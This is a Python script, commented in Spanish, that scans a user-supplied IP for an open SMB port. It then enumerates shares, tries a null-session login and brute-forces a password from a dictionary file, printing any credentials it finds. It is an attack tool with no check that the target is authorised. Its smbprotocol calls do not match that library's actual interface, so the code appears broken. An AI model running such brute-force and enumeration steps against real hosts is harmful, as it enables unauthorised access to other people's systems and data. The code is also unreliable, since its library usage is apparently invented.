import nmap
import smbprotocol

def smb_scan(target_ip):
    # Crear un objeto de escaneo Nmap
    scanner = nmap.PortScanner()

    # Realizar el escaneo de puertos SMB
    scanner.scan(target_ip, '445')

    # Obtener el estado de los puertos
    state = scanner[target_ip]['tcp'][445]['state']

    # Verificar si el puerto 445 (SMB) está abierto
    if state == 'open':
        print("El puerto 445 (SMB) está abierto en la IP:", target_ip)
        # Realizar pruebas de vulnerabilidad y exploración de SMB
        print("Iniciando pruebas de vulnerabilidad y exploración de SMB...")

        # Prueba de enumeración de shares
        print("[*] Enumeración de shares:")
        try:
            smb_client = smbprotocol.SMB(target_ip)
            shares = smb_client.list_shares()
            for share in shares:
                print("  -", share.name)
        except Exception as e:
            print("Error:", str(e))

        # Prueba de autenticación nula
        print("[*] Prueba de autenticación nula:")
        try:
            smb_client = smbprotocol.SMB(target_ip)
            smb_client.login()
            print("  - Autenticación nula exitosa")
        except Exception as e:
            print("  - Autenticación nula fallida")

        # Prueba de fuerza bruta de credenciales
        print("[*] Prueba de fuerza bruta de credenciales:")
        username = input("Ingrese el nombre de usuario: ")
        dictionary_file = input("Ingrese la ruta del diccionario de contraseñas: ")

        with open(dictionary_file, 'r') as file:
            passwords = file.read().splitlines()

        for password in passwords:
            try:
                smb_client = smbprotocol.SMB(target_ip)
                smb_client.login(username, password)
                print("  - Credenciales válidas encontradas:")
                print("    Usuario:", username)
                print("    Contraseña:", password)
                break
            except Exception as e:
                pass

        # Agrega más pruebas de vulnerabilidad según tus necesidades

    else:
        print("El puerto 445 (SMB) está cerrado en la IP:", target_ip)

# Solicitar al usuario la IP objetivo
target_ip = input("Ingrese la dirección IP objetivo: ")

# Realizar el escaneo SMB
smb_scan(target_ip)
